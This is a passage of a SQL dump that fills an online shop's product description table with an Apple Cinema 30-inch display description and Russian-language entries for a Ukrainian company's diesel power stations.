INSERT INTO `oc_product_description` VALUES (42,4,'Apple Cinema 30&quot;','&lt;p&gt;\r\n	&lt;font face=&quot;helvetica,geneva,arial&quot; size=&quot;2&quot;&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;The 30-inch Apple Cinema HD Display delivers an amazing 2560 x 1600 pixel resolution. Designed specifically for the creative professional, this display provides more space for easier access to all the tools and palettes needed to edit, format and composite your work. Combine this display with a Mac Pro, MacBook Pro, or PowerMac G5 and there\'s no limit to what you can achieve. &lt;br&gt;\r\n	&lt;br&gt;\r\n	&lt;/font&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;The Cinema HD features an active-matrix liquid crystal display that produces flicker-free images that deliver twice the brightness, twice the sharpness and twice the contrast ratio of a typical CRT display. Unlike other flat panels, it\'s designed with a pure digital interface to deliver distortion-free images that never need adjusting. With over 4 million digital pixels, the display is uniquely suited for scientific and technical applications such as visualizing molecular structures or analyzing geological data. &lt;br&gt;\r\n	&lt;br&gt;\r\n	&lt;/font&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;Offering accurate, brilliant color performance, the Cinema HD delivers up to 16.7 million colors across a wide gamut allowing you to see subtle nuances between colors from soft pastels to rich jewel tones. A wide viewing angle ensures uniform color from edge to edge. Apple\'s ColorSync technology allows you to create custom profiles to maintain consistent color onscreen and in print. The result: You can confidently use this display in all your color-critical applications. &lt;br&gt;\r\n	&lt;br&gt;\r\n	&lt;/font&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;Housed in a new aluminum design, the display has a very thin bezel that enhances visual accuracy. Each display features two FireWire 400 ports and two USB 2.0 ports, making attachment of desktop peripherals, such as iSight, iPod, digital and still cameras, hard drives, printers and scanners, even more accessible and convenient. Taking advantage of the much thinner and lighter footprint of an LCD, the new displays support the VESA (Video Electronics Standards Association) mounting interface standard. Customers with the optional Cinema Display VESA Mount Adapter kit gain the flexibility to mount their display in locations most appropriate for their work environment. &lt;br&gt;\r\n	&lt;br&gt;\r\n	&lt;/font&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;The Cinema HD features a single cable design with elegant breakout for the USB 2.0, FireWire 400 and a pure digital connection using the industry standard Digital Video Interface (DVI) interface. The DVI connection allows for a direct pure-digital connection.&lt;br&gt;\r\n	&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;\r\n&lt;h3&gt;\r\n	Features:&lt;/h3&gt;\r\n&lt;p&gt;\r\n	Unrivaled display performance&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		30-inch (viewable) active-matrix liquid crystal display provides breathtaking image quality and vivid, richly saturated color.&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Support for 2560-by-1600 pixel resolution for display of high definition still and video imagery.&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Wide-format design for simultaneous display of two full pages of text and graphics.&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Industry standard DVI connector for direct attachment to Mac- and Windows-based desktops and notebooks&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Incredibly wide (170 degree) horizontal and vertical viewing angle for maximum visibility and color performance.&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Lightning-fast pixel response for full-motion digital video playback.&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Support for 16.7 million saturated colors, for use in all graphics-intensive applications.&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	Simple setup and operation&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Single cable with elegant breakout for connection to DVI, USB and FireWire ports&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Built-in two-port USB 2.0 hub for easy connection of desktop peripheral devices.&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Two FireWire 400 ports to support iSight and other desktop peripherals&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	Sleek, elegant design&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Huge virtual workspace, very small footprint.&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Narrow Bezel design to minimize visual impact of using dual displays&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Unique hinge design for effortless adjustment&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Support for VESA mounting solutions (Apple Cinema Display VESA Mount Adapter sold separately)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;h3&gt;\r\n	Technical specifications&lt;/h3&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Screen size (diagonal viewable image size)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Apple Cinema HD Display: 30 inches (29.7-inch viewable)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Screen type&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Thin film transistor (TFT) active-matrix liquid crystal display (AMLCD)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Resolutions&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		2560 x 1600 pixels (optimum resolution)&lt;/li&gt;\r\n	&lt;li&gt;\r\n		2048 x 1280&lt;/li&gt;\r\n	&lt;li&gt;\r\n		1920 x 1200&lt;/li&gt;\r\n	&lt;li&gt;\r\n		1280 x 800&lt;/li&gt;\r\n	&lt;li&gt;\r\n		1024 x 640&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Display colors (maximum)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		16.7 million&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Viewing angle (typical)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		170° horizontal; 170° vertical&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Brightness (typical)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		30-inch Cinema HD Display: 400 cd/m2&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Contrast ratio (typical)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		700:1&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Response time (typical)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		16 ms&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Pixel pitch&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		30-inch Cinema HD Display: 0.250 mm&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Screen treatment&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Antiglare hardcoat&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;User controls (hardware and software)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Display Power,&lt;/li&gt;\r\n	&lt;li&gt;\r\n		System sleep, wake&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Brightness&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Monitor tilt&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Connectors and cables&lt;/b&gt;&lt;br&gt;\r\n	Cable&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		DVI (Digital Visual Interface)&lt;/li&gt;\r\n	&lt;li&gt;\r\n		FireWire 400&lt;/li&gt;\r\n	&lt;li&gt;\r\n		USB 2.0&lt;/li&gt;\r\n	&lt;li&gt;\r\n		DC power (24 V)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	Connectors&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Two-port, self-powered USB 2.0 hub&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Two FireWire 400 ports&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Kensington security port&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;VESA mount adapter&lt;/b&gt;&lt;br&gt;\r\n	Requires optional Cinema Display VESA Mount Adapter (M9649G/A)&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Compatible with VESA FDMI (MIS-D, 100, C) compliant mounting solutions&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Electrical requirements&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Input voltage: 100-240 VAC 50-60Hz&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Maximum power when operating: 150W&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Energy saver mode: 3W or less&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Environmental requirements&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Operating temperature: 50° to 95° F (10° to 35° C)&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Storage temperature: -40° to 116° F (-40° to 47° C)&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Operating humidity: 20% to 80% noncondensing&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Maximum operating altitude: 10,000 feet&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Agency approvals&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		FCC Part 15 Class B&lt;/li&gt;\r\n	&lt;li&gt;\r\n		EN55022 Class B&lt;/li&gt;\r\n	&lt;li&gt;\r\n		EN55024&lt;/li&gt;\r\n	&lt;li&gt;\r\n		VCCI Class B&lt;/li&gt;\r\n	&lt;li&gt;\r\n		AS/NZS 3548 Class B&lt;/li&gt;\r\n	&lt;li&gt;\r\n		CNS 13438 Class B&lt;/li&gt;\r\n	&lt;li&gt;\r\n		ICES-003 Class B&lt;/li&gt;\r\n	&lt;li&gt;\r\n		ISO 13406 part 2&lt;/li&gt;\r\n	&lt;li&gt;\r\n		MPR II&lt;/li&gt;\r\n	&lt;li&gt;\r\n		IEC 60950&lt;/li&gt;\r\n	&lt;li&gt;\r\n		UL 60950&lt;/li&gt;\r\n	&lt;li&gt;\r\n		CSA 60950&lt;/li&gt;\r\n	&lt;li&gt;\r\n		EN60950&lt;/li&gt;\r\n	&lt;li&gt;\r\n		ENERGY STAR&lt;/li&gt;\r\n	&lt;li&gt;\r\n		TCO \'03&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Size and weight&lt;/b&gt;&lt;br&gt;\r\n	30-inch Apple Cinema HD Display&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Height: 21.3 inches (54.3 cm)&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Width: 27.2 inches (68.8 cm)&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Depth: 8.46 inches (21.5 cm)&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Weight: 27.5 pounds (12.5 kg)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;System Requirements&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Mac Pro, all graphic options&lt;/li&gt;\r\n	&lt;li&gt;\r\n		MacBook Pro&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Power Mac G5 (PCI-X) with ATI Radeon 9650 or better or NVIDIA GeForce 6800 GT DDL or better&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Power Mac G5 (PCI Express), all graphics options&lt;/li&gt;\r\n	&lt;li&gt;\r\n		PowerBook G4 with dual-link DVI support&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Windows PC and graphics card that supports DVI ports with dual-link digital bandwidth and VESA DDC standard for plug-and-play setup&lt;/li&gt;\r\n&lt;/ul&gt;\r\n','','Apple Cinema 30&quot;','',''),(55,3,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','ssp-22','',''),(55,4,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','ssp-22','',''),(55,1,'SSI-160 ','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSI-160 ','',''),(56,1,'SSI-200 ','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSI-200 ','',''),(57,3,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','ssp-22','',''),(57,4,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','ssp-22','',''),(53,4,'SSP 20','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','ssp-20','',''),(69,1,'SSM-100 ','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot; на базе недорогих и экономных дизельных двигателей ММЗ (Беларусь) и генераторов Marelli, Linz, Mecc Alte (Италия). Собственное производство, оригинальные комлектующие, гарантия 1 год или 1000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SMM','SSM-100 ','',''),(59,1,'SSM-16-L ','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot; на базе недорогих и экономных дизельных двигателей ММЗ (Беларусь) и генераторов Marelli, Linz, Mecc Alte (Италия). Собственное производство, оригинальные комлектующие, гарантия 1 год или 1000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SMM','SSM-16-L ','',''),(61,1,'SSM-22 ','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot; на базе недорогих и экономных дизельных двигателей ММЗ (Беларусь) и генераторов Marelli, Linz, Mecc Alte (Италия). Собственное производство, оригинальные комлектующие, гарантия 1 год или 1000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SMM','SSM-22 ','',''),(62,1,'SSM-25 ','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot; на базе недорогих и экономных дизельных двигателей ММЗ (Беларусь) и генераторов Marelli, Linz, Mecc Alte (Италия). Собственное производство, оригинальные комлектующие, гарантия 1 год или 1000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SMM','SSM-25 ','',''),(63,1,'SSM-30 ','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot; на базе недорогих и экономных дизельных двигателей ММЗ (Беларусь) и генераторов Marelli, Linz, Mecc Alte (Италия). Собственное производство, оригинальные комлектующие, гарантия 1 год или 1000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SMM','SSM-30 ','',''),(52,1,'SSI-96 ','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSI-96 ','',''),(53,3,'SSP 20','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','ssp-20','',''),(64,1,'SSM-40 ','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot; на базе недорогих и экономных дизельных двигателей ММЗ (Беларусь) и генераторов Marelli, Linz, Mecc Alte (Италия). Собственное производство, оригинальные комлектующие, гарантия 1 год или 1000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SMM','SSM-40 ','',''),(65,1,'SSM-48 ','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot; на базе недорогих и экономных дизельных двигателей ММЗ (Беларусь) и генераторов Marelli, Linz, Mecc Alte (Италия). Собственное производство, оригинальные комлектующие, гарантия 1 год или 1000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SMM','SSM-48 ','',''),(54,1,'SSI-136 ','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSI-136 ','',''),(50,3,'SSP 16','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','ssp-16','',''),(50,4,'SSP 16','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','ssp-16','',''),(54,3,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','ssp-22','',''),(53,1,'SSI-64','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр. &lt;br&gt;&lt;/p&gt;','SSP','SSI-64','',''),(52,3,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','ssp-22','',''),(52,4,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','ssp-22','',''),(56,3,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','ssp-22','',''),(56,4,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','ssp-22','',''),(57,1,'SSI-240 ','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSI-240 ','',''),(50,1,'SSI-40 ','Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.','SSP','ssp-16','',''),(58,3,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','ssp-22','',''),(58,4,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','ssp-22','',''),(59,3,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SMM','ssp-22','',''),(59,4,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SMM','ssp-22','',''),(60,3,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SMM','ssp-22','',''),(60,1,'SSM-20 ','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot; на базе недорогих и экономных дизельных двигателей ММЗ (Беларусь) и генераторов Marelli, Linz, Mecc Alte (Италия). Собственное производство, оригинальные комлектующие, гарантия 1 год или 1000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SMM','SSM-20 ','',''),(61,3,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SMM','ssp-22','',''),(61,4,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SMM','ssp-22','',''),(62,4,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SMM','ssp-22','',''),(63,3,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SMM','ssp-22','',''),(63,4,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SMM','ssp-22','',''),(64,3,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SMM','ssp-22','',''),(64,4,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SMM','ssp-22','',''),(65,3,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SMM','ssp-22','',''),(65,4,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SMM','ssp-22','',''),(66,3,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SMM','ssp-22','',''),(66,4,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SMM','ssp-22','',''),(67,3,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SMM','ssp-22','',''),(67,4,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SMM','ssp-22','',''),(68,3,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SMM','ssp-22','',''),(68,4,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SMM','ssp-22','',''),(69,3,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SMM','ssp-22','',''),(69,4,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SMM','ssp-22','',''),(58,1,'SSI-400 ','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSI-400 ','',''),(62,3,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SMM','ssp-22','',''),(60,4,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SMM','ssp-22','',''),(66,1,'SSM-60 ','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot; на базе недорогих и экономных дизельных двигателей ММЗ (Беларусь) и генераторов Marelli, Linz, Mecc Alte (Италия). Собственное производство, оригинальные комлектующие, гарантия 1 год или 1000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SMM','SSM-60 ','',''),(67,1,'SSM-74 ','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot; на базе недорогих и экономных дизельных двигателей ММЗ (Беларусь) и генераторов Marelli, Linz, Mecc Alte (Италия). Собственное производство, оригинальные комлектующие, гарантия 1 год или 1000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SMM','SSM-74 ','',''),(68,1,'SSM-84 ','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot; на базе недорогих и экономных дизельных двигателей ММЗ (Беларусь) и генераторов Marelli, Linz, Mecc Alte (Италия). Собственное производство, оригинальные комлектующие, гарантия 1 год или 1000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SMM','SSM-84 ','',''),(70,3,'SSD - 10','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 10','',''),(70,4,'SSD - 10','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 10','',''),(70,1,'SSD - 10','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSD - 10','',''),(71,1,'SSD - 16','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSD - 16','',''),(71,3,'SSD - 16','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 16','',''),(71,4,'SSD - 16','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 16','',''),(72,4,'SSD - 25','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 25','',''),(72,3,'SSD - 25','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 25','',''),(72,1,'SSD - 25','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSD - 25','',''),(73,4,'SSD - 30','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 30','',''),(54,4,'SSP 22','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','ssp-22','',''),(73,3,'SSD - 30','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 30','',''),(73,1,'SSD - 30','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSD - 30','',''),(74,3,'SSD - 45','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 45','',''),(74,4,'SSD - 45','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 45','',''),(74,1,'SSD - 45','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSD - 45','',''),(75,3,'SSD - 60','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 60','',''),(75,4,'SSD - 60','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 60','',''),(75,1,'SSD - 60','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSD - 60','',''),(76,3,'SSD - 80','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 80','',''),(76,4,'SSD - 80','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 80','',''),(76,1,'SSD - 80','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSD - 80','',''),(77,4,'SSD - 100','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 100','',''),(77,3,'SSD - 100','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 100','',''),(77,1,'SSD - 100','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSD - 100','',''),(78,4,'SSD - 120','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 120','',''),(78,1,'SSD - 120','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSD - 120','',''),(78,3,'SSD - 120','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 120','',''),(79,4,'SSD - 150','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 150','',''),(79,1,'SSD - 150','&lt;p&gt;Электростанция сборки предприятия &quot;НВП СПЕЦ – СЕРВИС&quot;, исключительно из фирменных комплектующих от лучших европейских производителей. Собственное производство, оригинальные комлектующие, гарантия 2 года или 2000 м/ч, сервис по всей Укриане,учебный центр.&lt;br&gt;&lt;/p&gt;','SSP','SSD - 150','',''),(79,3,'SSD - 150','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','SSP','SSD - 150','',''),(80,1,'SSD - 200','&lt;p&gt;Электростанция сборки предприятия &quot;НВП 